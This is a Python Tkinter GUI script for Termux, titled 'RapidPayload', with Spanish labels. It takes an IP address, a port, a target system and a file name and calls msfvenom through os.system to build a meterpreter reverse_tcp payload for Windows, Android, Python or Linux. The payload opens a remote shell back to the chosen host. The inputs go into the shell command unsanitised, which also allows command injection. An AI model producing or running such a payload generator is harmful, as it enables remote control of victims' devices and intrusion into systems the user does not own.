#!/data/data/com.termux/files/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  prueba.py
#
#  Copyright 2021 Yisus7u7v <jesuspixel5@gmail.com >
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.

#importando las librerias
import tkinter as Tk
from tkinter import *
import tkinter.font as tkFont
from tkinter import ttk
import os
from tkinter import messagebox

#configurando la app
root = Tk()
root.geometry('600x300')
root.title('RapidPayload')
root.iconphoto(True, PhotoImage(file='/data/data/com.termux/files/usr/share/rapid_payload/icon.png'))

def obtener():
	sys = sistema.get()
	ip = owo.get()
	puerto = uwu.get()
	name = nombre.get()
	messagebox.showwarning(message="Generando payload...", title="info")
	os.system(f'msfvenom -p {sys}/meterpreter/reverse_tcp LHOST={ip} LPORT={puerto} -o ~/{name}')
	messagebox.showinfo(message="payload generado!!!", title="info")


#arreglo de fuente
tkfont = tkFont.Font(family="Lucida Grande", size=12)


#textos y valores
text = Label(root, text = 'Ingresa la IP de tu payload', font = tkfont, fg='yellow', bg='green' )
text.grid(column=1, row=0)
owo = Entry(root)
owo.grid(column=1, row=1)
text2 = Label(root, text = 'Ingresa el puerto de tu payload', font = tkfont, fg='yellow', bg='red' )
text2.grid(column=1, row=3)

text3 = Label(root, text='ingrese el nombre y extencion para el archivo', font= tkfont, fg='yellow', bg='blue')
text3.grid(column=1, row=5)

text4 = Label(root, text='elije el sistema', font= tkfont, fg='black', bg='yellow')
text4.grid(column=0, row=3)

sistema = ttk.Combobox(root)
sistema.grid(column=0, row=4)


nombre = Entry(root)
nombre.grid(column=1, row=6)

#variables de combobox
sistemas = ["windows", "android", "python", "linux"]
sistema["values"]=sistemas



#botones y arreglos finales
btn = Button(root, text = 'generar', fg='white', bg='black', command = obtener)
btn.grid(column=1, row=7)

uwu = Entry(root)
uwu.grid(column=1, row=4)

Label(root, text='''
el payload se guardara en $HOME
/data/data/com.termux/files/home
''', fg='black').grid()

root.mainloop()
